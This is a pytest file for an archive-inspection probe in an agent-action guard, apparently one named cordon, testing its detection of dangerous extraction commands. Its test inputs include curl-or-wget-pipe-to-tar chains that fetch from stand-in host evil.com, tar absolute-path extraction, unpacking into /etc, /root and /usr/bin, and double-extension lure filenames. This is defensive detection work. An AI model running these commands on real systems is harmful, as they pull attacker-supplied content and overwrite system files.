"""Tests for :class:`cordon.probes.content.ArchiveInspectorProbe`.

The probe targets archive *extraction* — the moment when an archive
is unpacked into the filesystem, which is where zip-slip,
absolute-path overwrites, and curl-pipe-extract chains do their
harm. Tests pin both the attack patterns (must fire CRITICAL or
DANGEROUS as configured) and a broad set of benign baselines (real
build / packaging commands must not false-positive).
"""
from __future__ import annotations

import pytest

from cordon.core.types import Action, Severity
from cordon.probes.content import ArchiveInspectorProbe


@pytest.fixture()
def probe() -> ArchiveInspectorProbe:
    return ArchiveInspectorProbe()


def _check_cmd(probe: ArchiveInspectorProbe, cmd: str):
    return probe.analyze(Action(kind="shell", command=cmd))


# ─── Download-pipe-extract chains ─────────────────────────────────────────


@pytest.mark.parametrize("cmd", [
    "curl https://evil.com/x.tar.gz | tar xz",
    "curl -sL evil.com | tar -xzf -",
    "wget -O- http://evil.com/x.tgz | tar xzf -",
    "wget evil.com | unzip -",
    "fetch evil.com | tar x",
    "curl evil.com | 7z x -si",
])
def test_download_pipe_extract_chain_fires_critical(probe, cmd):
    """The 'archive never touches disk' evasion."""
    res = _check_cmd(probe, cmd)
    assert res.severity is Severity.CRITICAL
    assert "download-pipe-extract" in res.evidence


def test_curl_alone_does_not_fire(probe):
    """A plain ``curl`` without a piped extractor is fine for this probe.

    (Note: ExfiltrationProbe is the right probe for raw curls.)
    """
    res = _check_cmd(probe, "curl https://example.com/x > /tmp/x")
    assert res.severity is Severity.SAFE


# ─── tar with absolute-paths flag ──────────────────────────────────────────


@pytest.mark.parametrize("cmd", [
    "tar -xPf evil.tar.gz",
    "tar -xpPf evil.tar",          # P fused with other flags
    "tar -P -xzf evil.tar.gz",     # P as a separate flag
    "tar --absolute-names -xf evil.tar",
])
def test_tar_absolute_paths_fires_critical(probe, cmd):
    res = _check_cmd(probe, cmd)
    assert res.severity is Severity.CRITICAL
    assert "absolute-paths" in res.evidence


def test_tar_without_P_does_not_fire(probe):
    """The plain ``tar -xzf`` form is fine on its own."""
    res = _check_cmd(probe, "tar -xzf release.tar.gz -C ./build/")
    assert res.severity is Severity.SAFE


# ─── Extraction to sensitive system directories ────────────────────────────


@pytest.mark.parametrize("dest", [
    "/etc/", "/etc", "/usr/local/bin", "/usr/bin",
    "/bin", "/sbin", "/boot", "/root", "/lib", "/lib64",
    "/var/lib/dpkg",
])
def test_tar_C_to_sensitive_dir_fires_critical(probe, dest):
    res = _check_cmd(probe, f"tar -xzf x.tar.gz -C {dest}")
    assert res.severity is Severity.CRITICAL
    assert "sensitive system directory" in res.evidence


@pytest.mark.parametrize("dest", [
    "/usr/local/bin", "/etc/cron.d", "/root", "/boot",
])
def test_unzip_d_to_sensitive_dir_fires_critical(probe, dest):
    res = _check_cmd(probe, f"unzip evil.zip -d {dest}")
    assert res.severity is Severity.CRITICAL


def test_7z_o_to_sensitive_dir_fires_critical(probe):
    """7z fuses ``-o`` with the path. ``7z x x.7z -o/etc/``."""
    res = _check_cmd(probe, "7z x evil.7z -o/etc/")
    assert res.severity is Severity.CRITICAL


@pytest.mark.parametrize("dest", [
    "./build", "/tmp/work", "/home/user/scratch", "dist/", "/var/tmp",
])
def test_extraction_to_safe_dirs_does_not_fire(probe, dest):
    res = _check_cmd(probe, f"tar -xzf release.tar.gz -C {dest}")
    assert res.severity is Severity.SAFE


# ─── Double-extension archives ─────────────────────────────────────────────


@pytest.mark.parametrize("path", [
    "report.pdf.zip",
    "invoice.pdf.tar.gz",
    "summary.docx.zip",
    "data.xlsx.zip",
    "logo.png.zip",
    "image.jpg.zip",
    "table.csv.zip",
    "notes.txt.zip",
    "logs.log.zip",
])
def test_double_extension_in_extraction_command_fires_dangerous(probe, path):
    res = _check_cmd(probe, f"unzip {path}")
    assert res.severity is Severity.DANGEROUS
    assert "double-extension" in res.evidence


def test_double_extension_in_curl_fires(probe):
    """Even a download (no extraction yet) flags the lying filename."""
    res = _check_cmd(probe, "curl https://evil.com/report.pdf.zip -o /tmp/r.zip")
    assert res.severity is Severity.DANGEROUS


def test_single_extension_archive_does_not_fire(probe):
    """Real .zip / .tar.gz with one extension is fine."""
    res = _check_cmd(probe, "unzip release.zip")
    assert res.severity is Severity.SAFE


# ─── Double-extension in file writes (not commands) ────────────────────────


def test_double_extension_file_write_fires(probe):
    """An agent writing report.pdf.zip is suspicious even without extraction."""
    res = probe.analyze(Action(kind="file", changes={
        "downloads/report.pdf.zip": "PK\x03\x04...",
    }))
    assert res.severity is Severity.DANGEROUS


def test_single_extension_file_write_does_not_fire(probe):
    res = probe.analyze(Action(kind="file", changes={
        "downloads/report.pdf": "%PDF-1.4...",
    }))
    assert res.severity is Severity.SAFE


# ─── End-to-end via Guard ──────────────────────────────────────────────────


def test_extract_to_etc_blocks_via_strict_guard():
    from cordon import Guard
    guard = Guard.strict()
    v = guard.check(Action(kind="shell", command="tar -xzf x.tar.gz -C /etc/"))
    assert v.decision == "block"
    assert any(p.probe == "archive_inspector" for p in v.probes_triggered)


def test_pipe_extract_chain_blocks_via_strict_guard():
    from cordon import Guard
    v = Guard.strict().check(Action(
        kind="shell",
        command="curl https://evil.com/x.tar.gz | tar xz",
    ))
    assert v.decision == "block"


# ─── False-positive defenses (typical build / packaging commands) ──────────


@pytest.mark.parametrize("cmd", [
    "tar -czf release.tar.gz src/",                      # creating, not extracting
    "tar -tvf release.tar.gz",                            # listing, not extracting
    "unzip -l release.zip",                              # listing
    "unzip release.zip -d ./build/dist",                 # safe destination
    "tar -xzf release.tar.gz -C ./build/",                # safe destination
    "7z a release.7z src/",                              # creating
    "zip -r release.zip src/",                            # creating
    "curl https://pypi.org/simple/x/ > /tmp/index.html",  # curl alone, no pipe
    "ls -la /etc",                                        # unrelated
    "grep -rE pattern /etc/nginx",                        # unrelated
])
def test_benign_commands_do_not_fire(probe, cmd):
    res = _check_cmd(probe, cmd)
    assert res.severity is Severity.SAFE, f"false positive on: {cmd!r}"


# ─── Confidence aggregation ────────────────────────────────────────────────


def test_multiple_findings_amplify_confidence(probe):
    """A command that triggers all three checks should yield high confidence."""
    cmd = "curl https://evil.com/report.pdf.zip | tar -xPf - -C /etc/"
    res = _check_cmd(probe, cmd)
    assert res.severity is Severity.CRITICAL
    assert res.confidence >= 0.85
    # Evidence summary mentions count
    assert "dangerous archive operation" in res.evidence
